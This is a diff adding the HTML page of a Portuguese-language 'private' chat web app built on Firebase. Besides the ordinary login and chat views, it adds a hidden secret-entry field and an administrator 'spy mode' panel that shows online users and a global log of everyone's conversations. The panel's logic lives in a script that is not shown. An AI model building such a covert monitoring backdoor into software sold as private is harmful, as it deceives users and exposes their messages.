@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat Privado com IA</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+
+    <div id="tela-login">
+        <h2>Entrar no Chat</h2>
+        <p>Digite seu nome para receber um número único.</p>
+        <input type="text" id="input-nome" placeholder="Seu Nome">
+        <button id="btn-entrar">Gerar meu Número</button>
+    </div>
+
+    <div id="app-container" style="display: none;">
+        
+        <div id="barra-lateral">
+            <div id="meu-perfil">
+                <strong id="nome-perfil">Nome</strong><br>
+                <small id="numero-perfil">Meu Nº: 000000</small>
+                <button id="btn-sair" style="font-size: 11px; padding: 3px 8px; margin-left: 10px; cursor: pointer; background: transparent; color: #00e5ff; border: 1px solid #00e5ff; border-radius: 4px;">Sair</button>
+            </div>
+            
+            <div id="nova-conversa">
+                <input type="text" id="input-novo-contato" placeholder="Nº do Amigo (6 dígitos)" maxlength="6">
+                <button id="btn-add-contato">+</button>
+            </div>
+
+            <div id="lista-contatos-lateral"></div>
+        </div>
+
+        <div id="chat-principal">
+            <div id="cabecalho-chat">
+                <span id="nome-contato-ativo">Selecione um contato para conversar</span>
+            </div>
+            
+            <div id="mensagens-chat"></div>
+            
+            <div id="area-digitacao" style="display: none;">
+                <input type="text" id="nova-mensagem" placeholder="Sua mensagem...">
+                <button id="btn-enviar">Enviar</button>
+            </div>
+        </div>
+    </div>
+
+    <input type="text" id="entrada-secreta" autocomplete="off">
+
+    <div id="painel-secreto">
+        <h2>Painel do Administrador (Modo Espião)</h2>
+        <div class="paineis-admin">
+            <div class="coluna-admin">
+                <h3>Usuários Online</h3>
+                <ul id="lista-usuarios"></ul>
+            </div>
+            <div class="coluna-admin">
+                <h3>Log Global de Conversas</h3>
+                <div id="log-escuta"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
